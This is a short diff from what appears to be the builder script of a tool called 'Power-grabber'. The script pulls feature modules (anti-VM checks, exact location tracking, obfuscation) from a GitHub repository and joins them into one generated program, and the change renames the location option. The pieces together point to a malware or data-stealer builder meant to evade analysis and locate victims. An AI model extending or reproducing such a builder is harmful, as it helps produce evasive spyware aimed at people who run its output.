@@ -52,7 +52,7 @@ if 'Port-Creation' in features:
 if 'Anti-VM' in features:
     vm_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/vm-check.py').text.strip()
     combined_code += vm_code + "\n" if vm_code else ""
-if 'Location' in features:
+if 'Exact-location' in features:
     location_code = requests.get('https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Location.py').text.strip()
     combined_code += location_code + "\n" if location_code else ""
 if 'Obfuscate' in features:
